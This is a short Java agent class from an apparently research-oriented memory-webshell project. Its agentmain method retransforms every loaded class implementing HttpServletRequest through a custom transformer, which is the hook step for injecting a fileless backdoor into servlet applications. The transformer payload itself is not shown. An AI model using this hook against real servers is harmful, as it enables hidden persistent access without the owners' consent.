package org.su18.memshell.agent;

import java.lang.instrument.Instrumentation;
import java.lang.reflect.Modifier;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

/**
 * @author su18
 */
public class TestAgent {

	/**
	 * 主要函数 agentmain
	 *
	 * @param inst Instrumentation对象
	 */
	public static void agentmain(String agentArgs, Instrumentation inst) {

		// 交给自定义 Transformer
		inst.addTransformer(new TestTransformer(), true);

		// 拿到所有加载的类判断进行 retransform
		Class<?>[] loadedClasses = inst.getAllLoadedClasses();
		for (Class<?> c : loadedClasses) {

			// 忽略接口和抽象类
			if (Modifier.isInterface(c.getModifiers()) && Modifier.isAbstract(c.getModifiers())) {
				continue;
			}

			List<Class<?>> list = Arrays.asList(c.getInterfaces());
			for (Class<?> o : list) {
				Class<?>[] classes = o.getInterfaces();
				list = new ArrayList<>(list);
				list.addAll(Arrays.asList(classes));
			}


			for (Class<?> cs : list) {
				if ("javax.servlet.http.HttpServletRequest".equals(cs.getName())) {
					System.out.println("add retransform classes: " + c.getName());
					try {
						inst.retransformClasses(c);
						break;
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
			}
		}
	}

}
